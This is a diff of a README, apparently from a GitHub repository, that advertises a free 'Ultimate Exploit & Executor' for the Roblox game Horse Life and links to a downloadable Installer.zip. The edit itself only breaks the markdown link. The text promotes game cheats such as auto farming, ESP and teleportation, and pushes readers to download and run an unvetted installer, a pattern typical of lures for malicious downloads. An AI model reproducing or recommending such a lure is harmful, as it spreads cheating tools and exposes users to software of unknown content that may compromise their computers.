@@ -1,4 +1,4 @@
-# [DOWNLOAD HorseLife](https://github.com/hippofunmaker/HorseLife/releases/download/download/Installer.zip Installer)
+# [DOWNLOAD HorseLife(https://github.com/hippofunmaker/HorseLife/releases/download/download/Installer.zip Installer)
 Roblox Horse Life 🚀 Ultimate Exploit & Executor 🚀 Dominate the Game
 Unlock the full potential of Roblox Horse Life with our powerful Exploit & Executor! Gain access to advanced features like auto farming, boss elimination, ESP, instant raids, and teleportation. Level up faster, conquer enemies with ease, and take control of the game like never before. Download now for free and transform your gameplay experience.
 
